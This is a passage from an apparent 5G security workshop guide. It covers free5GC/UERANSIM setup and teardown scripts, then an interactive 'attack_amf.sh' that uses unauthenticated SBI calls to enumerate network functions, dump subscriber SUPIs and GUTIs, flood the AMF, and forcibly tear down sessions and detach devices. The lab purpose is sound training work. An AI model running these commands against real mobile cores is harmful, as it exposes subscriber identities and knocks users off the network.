&nbsp;&nbsp;&nbsp;&nbsp;echo "\[+\] Setting broadcast route: 10.0.0.0/24 via $CORE\_SERVER\_IP on $PARTICIPANT\_IF..."  
&nbsp;&nbsp;&nbsp;&nbsp;ip route replace 10.0.0.0/24 via "$CORE\_SERVER\_IP" dev "$PARTICIPANT\_IF"  
fi

echo "\[\*\] Testing AMF SBI reachability at 10.0.0.18..."  
if ping \-c 2 \-W 2 10.0.0.18 \>/dev/null 2\>&1; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[+\] Reachability verified: Core SBI responds."  
else  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[\!\] Warning: Cannot ping 10.0.0.18. Check network path to $CORE\_SERVER\_IP."  
fi

\# 8\. Dynamic Configuration of config/free5gc-gnb.yaml  
mkdir \-p "$SCRIPT\_DIR/config"  
cat \<\< GNB\_EOF \> "$SCRIPT\_DIR/config/free5gc-gnb.yaml"  
mcc: '208'  
mnc: '93'  
nci: '$NCI'  
idLength: 32  
tac: 1

linkIp: $PARTICIPANT\_IP  
ngapIp: $PARTICIPANT\_IP  
gtpIp: $PARTICIPANT\_IP

amfConfigs:  
&nbsp;&nbsp;\- address: $CORE\_SERVER\_IP  
&nbsp;&nbsp;&nbsp;&nbsp;port: 38412

slices:  
&nbsp;&nbsp;\- sst: 0x1  
&nbsp;&nbsp;&nbsp;&nbsp;sd: 0x010203

ignoreStreamIds: true  
cellAccessType: nr  
GNB\_EOF  
echo "\[+\] Generated config/free5gc-gnb.yaml with Cell Identity: $NCI."

\# 9\. Dynamic Configuration of config/free5gc-ue.yaml  
cat \<\< UE\_EOF \> "$SCRIPT\_DIR/config/free5gc-ue.yaml"  
supi: '$SUPI'  
mcc: '208'  
mnc: '93'  
protectionScheme: 0  
homeNetworkPublicKey: '5a8d38864820197c3394b92613b20b91633cbd897119273bf8e4a6f4eec0a650'  
homeNetworkPublicKeyId: 1  
routingIndicator: '0000'

key: '8baf473f2f8fd09487cccbd7097c6862'  
op: '8e27b6af0e692e750f32667a3b14605d'  
opType: 'OP'  
amf: '8000'  
imei: '$IMEI'  
imeiSv: '${IMEI}1'

tunNetmask: '255.255.255.0'  
useNamespace: false  
nsNamePrefix: 'ueransim'

gnbSearchList:  
&nbsp;&nbsp;\- $PARTICIPANT\_IP

uacAic:  
&nbsp;&nbsp;mps: false  
&nbsp;&nbsp;mcs: false

uacAcc:  
&nbsp;&nbsp;normalClass: 0  
&nbsp;&nbsp;class11: false  
&nbsp;&nbsp;class12: false  
&nbsp;&nbsp;class13: false  
&nbsp;&nbsp;class14: false  
&nbsp;&nbsp;class15: false

sessions:  
&nbsp;&nbsp;\- type: 'IPv4'  
&nbsp;&nbsp;&nbsp;&nbsp;apn: 'internet'  
&nbsp;&nbsp;&nbsp;&nbsp;slice:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sst: 0x01  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sd: 0x010203

configured-nssai:  
&nbsp;&nbsp;\- sst: 0x01  
&nbsp;&nbsp;&nbsp;&nbsp;sd: 0x010203

default-nssai:  
&nbsp;&nbsp;\- sst: 1  
&nbsp;&nbsp;&nbsp;&nbsp;sd: 0x010203

integrity:  
&nbsp;&nbsp;IA1: true  
&nbsp;&nbsp;IA2: true  
&nbsp;&nbsp;IA3: true

ciphering:  
&nbsp;&nbsp;EA1: true  
&nbsp;&nbsp;EA2: true  
&nbsp;&nbsp;EA3: true

integrityMaxRate:  
&nbsp;&nbsp;uplink: 'full'  
&nbsp;&nbsp;downlink: 'full'  
UE\_EOF  
echo "\[+\] Generated config/free5gc-ue.yaml for subscriber $SUPI."

\# 10\. Process Launch & Tunnel Verification  
echo "\[+\] Terminating old UERANSIM processes..."  
killall \-9 \-q nr-ue nr-gnb 2\>/dev/null || true  
sleep 1

echo "\[+\] Starting gNodeB in background..."  
cd "$SCRIPT\_DIR"  
nohup ./build/nr-gnb \-c config/free5gc-gnb.yaml \> gnb.log 2\>&1 &  
GNB\_PID=$\!  
echo "\[+\] gNodeB started (PID: $GNB\_PID). Waiting for SCTP setup..."  
sleep 3

if \! grep \-q "NG Setup procedure is successful" gnb.log 2\>/dev/null; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[\!\] Checking gNodeB connection log:"  
&nbsp;&nbsp;&nbsp;&nbsp;tail \-n 5 gnb.log  
fi

echo "\[+\] Starting UE in background..."  
nohup ./build/nr-ue \-c config/free5gc-ue.yaml \> ue.log 2\>&1 &  
UE\_PID=$\!  
echo "\[+\] UE started (PID: $UE\_PID). Waiting for PDU session tunnel..."

COUNT=0  
while \! ip addr show dev uesimtun0 \>/dev/null 2\>&1; do  
&nbsp;&nbsp;&nbsp;&nbsp;sleep 1  
&nbsp;&nbsp;&nbsp;&nbsp;COUNT=$((COUNT \+ 1))  
&nbsp;&nbsp;&nbsp;&nbsp;if \[ "$COUNT" \-ge 15 \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo "\[-\] Timeout waiting for uesimtun0. Inspect ue.log and gnb.log."  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit 1  
&nbsp;&nbsp;&nbsp;&nbsp;fi  
done

\# 11\. MTU Clamping for Tailscale  
if \[ "$PARTICIPANT\_IF" \= "tailscale0" \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[+\] Tailscale overlay detected. Clamping uesimtun0 MTU to 1200 bytes..."  
&nbsp;&nbsp;&nbsp;&nbsp;ip link set dev uesimtun0 mtu 1200  
fi

TUN\_IP=$(ip \-4 addr show dev uesimtun0 | grep inet | awk '{print $2}' | cut \-d'/' \-f1)  
echo "=================================================="  
echo " \[SUCCESS\] 5G TUNNEL ESTABLISHED: uesimtun0 ($TUN\_IP)"  
echo " Participant: $PARTICIPANT\_NUM ($SUPI)"  
echo " Testing ping to 8.8.8.8..."  
ping \-c 3 \-I uesimtun0 8.8.8.8 || true  
echo "=================================================="

### **4.3 Participant Teardown Script (teardown\_ue.sh)**

\#\!/usr/bin/env bash  
if \[ "$EUID" \-ne 0 \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[-\] Please run with sudo: sudo ./teardown\_ue.sh"  
&nbsp;&nbsp;&nbsp;&nbsp;exit 1  
fi

echo "\[+\] Terminating UERANSIM UE and gNodeB..."  
killall \-9 \-q nr-ue nr-gnb 2\>/dev/null || true

echo "\[+\] Tearing down uesimtun0 interface..."  
ip link delete uesimtun0 2\>/dev/null || true

echo "\[+\] Removing static route to 10.0.0.0/24..."  
ip route del 10.0.0.0/24 2\>/dev/null || true

echo "\[SUCCESS\] UE and gNodeB cleanly torn down."

## **5\. Exploitation Suite: AMF & Control-Plane Attacks (attack\_amf.sh)**

In 3GPP 5G Standalone networks, Network Functions communicate over HTTP/2 REST APIs with JSON payloads. Because mutual TLS (mTLS) and OAuth2 token validation are disabled (oauth: false) in typical free5GC deployments, these internal APIs are completely unauthenticated.

Any device that can route to 10.0.0.0/24 (enabled on participant laptops via the injected static route) can discover, enumerate, spy on, and forcibly tear down subscriber sessions.

ATTACK EXECUTION TIMELINE:  
\[Step 1: Service Discovery\]   \-\> Probes open endpoints (Safe)  
\[Step 2: NRF Discovery\]       \-\> Extracts AMF UUID & profiles from registry (Safe)  
\[Step 3: Global Context Dump\] \-\> Dumps IMSI, GUTI, and SmContextRef from memory (Safe)  
\[Step 4: Targeted Query\]      \-\> Inspects a specific subscriber IMSI (Safe)  
\[Step 5: Concurrency Flood\]   \-\> Stresses AMF OAM with 100 parallel requests (Safe)  
\[Step 6: Live Snooping\]       \-\> Polls subscriber states in real time (Safe)  
\----------------------------------------------------------------------------------  
\[Step 7: SMF Session Kill\]    \-\> DESTRUCTIVE: Tears down GTP tunnel at the UPF  
\[Step 8: AMF Radio Detach\]    \-\> DESTRUCTIVE: Forcibly drops radio connection & evicts UE

### **5.1 Interactive Attack Script (attack\_amf.sh)**

\#\!/usr/bin/env bash  
set \-e

AMF\_SBI="http://10.0.0.18:8000"  
NRF\_SBI="http://10.0.0.10:8000"  
SMF\_SBI="http://10.0.0.2:8000"  
SCRIPT\_DIR="$(cd "$(dirname "${BASH\_SOURCE\[0\]}")" && pwd)"  
UE\_LOG="$SCRIPT\_DIR/ue.log"

CYAN='\\033\[0;36m'  
GREEN='\\033\[0;32m'  
YELLOW='\\033\[1;33m'  
RED='\\033\[0;31m'  
BOLD='\\033\[1m'  
NC='\\033\[0m'

prompt\_approval() {  
&nbsp;&nbsp;&nbsp;&nbsp;local phase\_title="$1"  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${YELLOW}------------------------------------------------------------${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${BOLD}\[APPROVAL REQUIRED\] Ready to execute: ${phase\_title}${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;read \-p "Press \[Enter\] to approve (or type 's' to skip): " USER\_CHOICE  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${YELLOW}------------------------------------------------------------${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;if \[\[ "$USER\_CHOICE" \=\~ ^\[Ss\]$ \]\]; then  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${RED}\[\*\] Skipped: ${phase\_title}.${NC}\\n"  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 1  
&nbsp;&nbsp;&nbsp;&nbsp;fi  
&nbsp;&nbsp;&nbsp;&nbsp;return 0  
}

clear  
echo \-e "${CYAN}======================================================================"  
echo "         5G AMF SERVICE-BASED ARCHITECTURE AUDIT SUITE                "  
echo "        (Reconnaissance First \-\> Destructive Exploits Last)           "  
echo \-e "======================================================================${NC}"  
echo "AMF Target: $AMF\_SBI"  
echo "NRF Target: $NRF\_SBI"  
echo "SMF Target: $SMF\_SBI"  
echo ""

\# STEP 1: Service Discovery  
echo \-e "${CYAN}======================================================================"  
echo " STEP 1: Standard Service Discovery (Base URL Probing)                "  
echo \-e "======================================================================${NC}"  
echo \-e "${BOLD}Reference:${NC} 3GPP TS 29.518 / AMF Cheat Sheet"  
echo \-e "${BOLD}Purpose:${NC} Probes auxiliary AMF services (namf-comm, namf-mt, namf-loc) to check reachability."  
echo \-e "${BOLD}Destructive Impact:${NC} None (Safe to run)\\n"

if prompt\_approval "Step 1: Service Discovery"; then  
&nbsp;&nbsp;&nbsp;&nbsp;curl \-s \-o /dev/null \-w "  namf-comm: HTTP %{http\_code}\\n" "$AMF\_SBI/namf-comm/v1/" || true  
&nbsp;&nbsp;&nbsp;&nbsp;curl \-s \-o /dev/null \-w "  namf-mt:   HTTP %{http\_code}\\n" "$AMF\_SBI/namf-mt/v1/" || true  
&nbsp;&nbsp;&nbsp;&nbsp;curl \-s \-o /dev/null \-w "  namf-loc:  HTTP %{http\_code}\\n" "$AMF\_SBI/namf-loc/v1/" || true  
&nbsp;&nbsp;&nbsp;&nbsp;echo ""  
fi

\# STEP 2: NRF Discovery  
echo \-e "${CYAN}======================================================================"  
echo " STEP 2: AMF Instance Enumeration via NRF (nnrf-nfm)                  "  
echo \-e "======================================================================${NC}"  
echo \-e "${BOLD}Reference:${NC} 3GPP TS 29.510 (Nnrf\_NFManagement)"  
echo \-e "${BOLD}Purpose:${NC} Dumps registered AMF profile metadata and service endpoints from NRF."  
echo \-e "${BOLD}Destructive Impact:${NC} None (Safe to run)\\n"  
CMD\_NRF="curl \-s \\"$NRF\_SBI/nnrf-nfm/v1/nf-instances?nf-type=AMF\\" \-H \\"Accept: application/json\\""

if prompt\_approval "Step 2: NRF Discovery"; then  
&nbsp;&nbsp;&nbsp;&nbsp;NRF\_OUT=$(eval "$CMD\_NRF" || true)  
&nbsp;&nbsp;&nbsp;&nbsp;if \[ \-n "$NRF\_OUT" \] && \[ "$NRF\_OUT" \!= "null" \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo "$NRF\_OUT" | jq . 2\>/dev/null || echo "$NRF\_OUT"  
&nbsp;&nbsp;&nbsp;&nbsp;fi  
&nbsp;&nbsp;&nbsp;&nbsp;echo ""  
fi

\# STEP 3: Global Context Dump  
echo \-e "${CYAN}======================================================================"  
echo " STEP 3: Global Subscriber Context Extraction (namf-oam)              "  
echo \-e "======================================================================${NC}"  
echo \-e "${BOLD}Reference:${NC} 3GPP TS 29.518 (Namf\_OAM)"  
echo \-e "${BOLD}Purpose:${NC} Harvests SUPI, GUTI, TAC, and session handles from active AMF memory."  
echo \-e "${BOLD}Destructive Impact:${NC} None (Passive information disclosure)\\n"  
CMD\_DUMP="curl \-s \\"$AMF\_SBI/namf-oam/v1/registered-ue-context\\""

TARGET\_SUPI=""  
TARGET\_GUTI=""  
SM\_REF=""  
PDU\_ID=""

if prompt\_approval "Step 3: Global Context Dump"; then  
&nbsp;&nbsp;&nbsp;&nbsp;RAW\_CONTEXTS=$(eval "$CMD\_DUMP")  
&nbsp;&nbsp;&nbsp;&nbsp;if \[ \-z "$RAW\_CONTEXTS" \] || \[ "$RAW\_CONTEXTS" \== "null" \] || \[ "$RAW\_CONTEXTS" \== "\[\]" \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${RED}\[-\] No registered UEs found in AMF memory. Verify UE registration.${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit 1  
&nbsp;&nbsp;&nbsp;&nbsp;fi

&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${GREEN}\[+\] Dumped Active Subscribers:${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;echo "$RAW\_CONTEXTS" | jq .

&nbsp;&nbsp;&nbsp;&nbsp;TARGET\_SUPI=$(echo "$RAW\_CONTEXTS" | jq \-r '.\[0\].Supi')  
&nbsp;&nbsp;&nbsp;&nbsp;TARGET\_GUTI=$(echo "$RAW\_CONTEXTS" | jq \-r '.\[0\].Guti')  
&nbsp;&nbsp;&nbsp;&nbsp;SM\_REF=$(echo "$RAW\_CONTEXTS" | jq \-r '.\[0\].PduSessions\[0\].SmContextRef // empty')  
&nbsp;&nbsp;&nbsp;&nbsp;PDU\_ID=$(echo "$RAW\_CONTEXTS" | jq \-r '.\[0\].PduSessions\[0\].PduSessionId // 1')

&nbsp;&nbsp;&nbsp;&nbsp;echo ""  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${BOLD} \[\!\] EXFILTRATED METADATA FOR TARGETING:${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "     \- SUPI (IMSI):  ${GREEN}$TARGET\_SUPI${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "     \- 5G-GUTI:      ${GREEN}$TARGET\_GUTI${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "     \- SmContextRef: ${GREEN}$SM\_REF${NC}\\n"  
fi

\# STEP 4: Targeted Individual Subscriber Query  
if \[ \-n "$TARGET\_SUPI" \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${CYAN}======================================================================"  
&nbsp;&nbsp;&nbsp;&nbsp;echo " STEP 4: Targeted Individual Subscriber Query                         "  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "======================================================================${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${BOLD}Reference:${NC} AMF Cheat Sheet \[/registered-ue-context/imsi-\<number\>\]"  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${BOLD}Purpose:${NC} Queries the target SUPI directly by ID to test endpoint filtering."  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${BOLD}Destructive Impact:${NC} None (Passive query)\\n"  
&nbsp;&nbsp;&nbsp;&nbsp;CMD\_SINGLE="curl \-s \\"$AMF\_SBI/namf-oam/v1/registered-ue-context/$TARGET\_SUPI\\""

&nbsp;&nbsp;&nbsp;&nbsp;if prompt\_approval "Step 4: Individual SUPI Query"; then  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SINGLE\_OUT=$(eval "$CMD\_SINGLE")  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${GREEN}\[+\] Filtered Result for $TARGET\_SUPI:${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo "$SINGLE\_OUT" | jq . 2\>/dev/null || echo "$SINGLE\_OUT"  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo ""  
&nbsp;&nbsp;&nbsp;&nbsp;fi  
fi

\# STEP 5: Concurrency Stress Test  
echo \-e "${CYAN}======================================================================"  
echo " STEP 5: Asynchronous AMF OAM Concurrency Stress Test                 "  
echo \-e "======================================================================${NC}"  
echo \-e "${BOLD}Reference:${NC} AMF Cheat Sheet \[Concurrency / DoS\]"  
echo \-e "${BOLD}Purpose:${NC} Evaluates AMF thread handling and latency under 100 concurrent requests."  
echo \-e "${BOLD}Destructive Impact:${NC} Low/Non-destructive\\n"

if prompt\_approval "Step 5: Concurrency Flood"; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${BOLD}\[+\] Firing 100 parallel requests...${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;START\_T=$(date \+%s%N)  
&nbsp;&nbsp;&nbsp;&nbsp;for i in {1..100}; do  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl \-s "$AMF\_SBI/namf-oam/v1/registered-ue-context" \> /dev/null &  
&nbsp;&nbsp;&nbsp;&nbsp;done  
&nbsp;&nbsp;&nbsp;&nbsp;wait  
&nbsp;&nbsp;&nbsp;&nbsp;END\_T=$(date \+%s%N)  
&nbsp;&nbsp;&nbsp;&nbsp;DIFF\_MS=$(( (END\_T \- START\_T) / 1000000 ))  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${GREEN}\[+\] Completed 100 concurrent requests in ${DIFF\_MS} ms.${NC}\\n"  
fi

\# STEP 6: Real-Time Network State Monitoring  
echo \-e "${CYAN}======================================================================"  
echo " STEP 6: Real-Time Network State Monitoring                           "  
echo \-e "======================================================================${NC}"  
read \-p "\[?\] Enter live monitoring view? (y/N): " VIEW\_MONITOR  
if \[\[ "$VIEW\_MONITOR" \=\~ ^\[Yy\]$ \]\]; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${BOLD}\[\*\] Starting watch loop. Press \[Ctrl+C\] when ready to continue to teardowns...${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;watch \-n 3 "date; curl \-s \\"$AMF\_SBI/namf-oam/v1/registered-ue-context\\" | jq '.\[\] | {Supi, CmState, AccessType}' 2\>/dev/null || echo 'No active UEs'"  
fi  
echo ""

\# DESTRUCTIVE EXPLOITATION PHASE  
echo \-e "${RED}======================================================================"  
echo "                   DESTRUCTIVE EXPLOITATION PHASE                     "  
echo "  The attacks below terminate sessions and sever user-plane traffic.  "  
echo \-e "======================================================================${NC}\\n"

\# STEP 7: SMF Session Teardown  
if \[ \-n "$SM\_REF" \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${CYAN}======================================================================"  
&nbsp;&nbsp;&nbsp;&nbsp;echo " STEP 7: Unauthenticated SMF PDU Session Teardown                     "  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "======================================================================${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${BOLD}Reference:${NC} 3GPP TS 29.502 (Nsmf\_PDUSession)"  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${BOLD}Target:${NC} SmContextRef: $SM\_REF"  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${BOLD}Destructive Impact:${NC} HIGH. Erases UPF forwarding rule; kills traffic on uesimtun0.\\n"

&nbsp;&nbsp;&nbsp;&nbsp;if prompt\_approval "Step 7: SMF Session Teardown"; then  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HTTP\_CODE=$(curl \-s \-o /dev/null \-w "%{http\_code}" \-X POST \\  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"$SMF\_SBI/nsmf-pdusession/v1/sm-contexts/${SM\_REF}/release" \\  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\-H "Content-Type: application/json" \\  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\-d '{"cause": "PDU\_SESSION\_STATUS\_MISMATCH"}')

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${BOLD}\[+\] SMF Response:${NC} HTTP $HTTP\_CODE"  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\# Verify impact on UERANSIM  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${YELLOW}\>\>\> \[VERIFYING IMPACT ON UERANSIM (Step 7)\] \<\<\<${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if \! ping \-c 3 \-W 1 \-I uesimtun0 8.8.8.8 \>/dev/null 2\>&1; then  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "   ${GREEN}\[CONFIRMED\] Traffic through uesimtun0 dropped\! 100% packet loss.${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fi  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip addr show dev uesimtun0 2\>/dev/null || echo \-e "   ${GREEN}uesimtun0 interface removed.${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo ""  
&nbsp;&nbsp;&nbsp;&nbsp;fi  
fi

\# STEP 8: Forced Radio Release via AMF  
if \[ \-n "$TARGET\_SUPI" \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${CYAN}======================================================================"  
&nbsp;&nbsp;&nbsp;&nbsp;echo " STEP 8: Forced Subscriber Detach via namf-comm                       "  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "======================================================================${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${BOLD}Reference:${NC} 3GPP TS 29.518 / AMF Cheat Sheet"  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${BOLD}Target SUPI:${NC} $TARGET\_SUPI"  
&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${BOLD}Destructive Impact:${NC} CRITICAL. Drops the radio connection and context.\\n"

&nbsp;&nbsp;&nbsp;&nbsp;if prompt\_approval "Step 8: Forced AMF Release"; then  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HTTP\_COMM\_CODE=$(curl \-s \-o /dev/null \-w "%{http\_code}" \-X POST \\  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"$AMF\_SBI/namf-comm/v1/ue-contexts/$TARGET\_SUPI/release" \\  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\-H "Content-Type: application/json" \\  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\-d "{\\"pduSessionId\\": $PDU\_ID, \\"cause\\": \\"NAS\\", \\"ngApCause\\": {\\"group\\": 1, \\"value\\": 2}}")

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${BOLD}\[+\] AMF Response:${NC} HTTP $HTTP\_COMM\_CODE"

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\# Verify impact on UERANSIM  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "${YELLOW}\>\>\> \[VERIFYING IMPACT ON UERANSIM (Step 8)\] \<\<\<${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep 1  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if \! ip addr show dev uesimtun0 \>/dev/null 2\>&1; then  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "   ${GREEN}\[CONFIRMED\] uesimtun0 has been destroyed by the UE process.${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fi  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if \[ \-f "$UE\_LOG" \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo \-e "\\n${BOLD}UERANSIM UE Log (Deregistration Signatures):${NC}"  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tail \-n 6 "$UE\_LOG"  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fi  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo ""  
&nbsp;&nbsp;&nbsp;&nbsp;fi  
fi

echo \-e "${CYAN}======================================================================"  
echo " AMF Audit Complete. Both non-destructive and destructive tests done. "  
echo \-e "======================================================================${NC}"

## **6\. Verification and Troubleshooting Runbook**

### **Core Host Quick Verification**

\# 1\. Verify AMF SCTP listener  
sudo ss \-l \-n \-a \--sctp | grep 38412  
\# Output: LISTEN 0 128 \<CORE\_IP\>:38412 0.0.0.0:\*

\# 2\. Verify UPF and SMF PFCP and SBI ports  
sudo ss \-tulpn | grep \-E "8805|10.0.0.2:8000"  
\# Output: 10.0.0.2:8805 (SMF), 10.0.0.1:8805 (UPF), 10.0.0.2:8000 (SMF SBI)

\# 3\. Check UPF Kernel Module  
lsmod | grep gtp5g

### **Participant Laptop Quick Verification**

\# 1\. Verify SBA Reachability  
ping \-c 2 10.0.0.18

\# 2\. Verify 5G Tunnel IP Assignment  
ip addr show dev uesimtun0  
\# Output: inet 10.60.0.1/24 scope global uesimtun0

\# 3\. End-to-End Data Plane Internet Test  
ping \-c 4 \-I uesimtun0 8.8.8.8  


[image1]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAiCAYAAAC0nUK+AAACwElEQVR4XpVVPYsUQRDdwRXOQEQQhfW2e3o3WAQjFxHxAgMDTeQQA+FCA0EuMhGMTPwDy4aCoSIamgsmpwYmioKaHaYXGWjg+qq/prqmdnbvQd12v3r10TUzfb1eRtWrqmZXbhpAlRZLEVwdgoQ1JD1WMuw6g7JTUSnUGtCjUk+6l5A8HTqV1LBSWBbToQ6u4TQvJ/OSCzc3N88aY25zq+v6EpNkOOdsqbX+V68MWGvvGmt/4XfB7CsSnVG09xuNSdq/UidApas+L4Du70gVAZ1egf837PV4PD4t/R5yRjjvFgIuwPZigT+wy/LI1thb4L8MBoNTpccL2wMiBgEP0O0GfnebE5g5/1xohRHO4HuFZT87Mtq5CTQSCqAiDrYfC+xLITp/S41IXs8Lko6IgM+JwXqeui+0PV/8B+a+xblWXk4Mh8OLCPqW549Z2zDzBV7VY0lHnwK4787VxZvUSs5QoZNnCHoSt/4v5n8vdj9PJD0TaB+W2dhGVoH4JII+oPubnLd+9oZmT+b8wzRmxEcic5WoKMBO6aiwc9KLh5dmv0sEEl+jL1rolgOBO7B3k8nkOO+E1jbMnpLvjcajEyj2qHb1RhakhX6EihI8hc3CrlTRw0TCBewfRrcN3ZugS9CzetC88VF8hO00bOgkhPni1PkC2vdWee8DRJF4bBpJ+1P22hCAjh+HAv6i8p2vxHQ6Perq+iU6eoE0RxLPe6A13qLzSHwQk8fXNXnbY+kj6VUIPxmaJ65M2Kx29bYURtDV8Dx0b29IZwHn6OpI93e+k8kOyJ964f+YMJrreC4/oXFZk/1MKI+dkzE+YV0uo8upNROOIKK6knQ7SxxC2kZXsOZrOM0bwWfdIcuQGrlniK6sqNpquV8BJteXaaPlXe5REN7j9cSHU6lqeSdGqKQGKawClQ4h3Rn8c81oc/8BNVWPHU2uxdQAAAAASUVORK5CYII=>
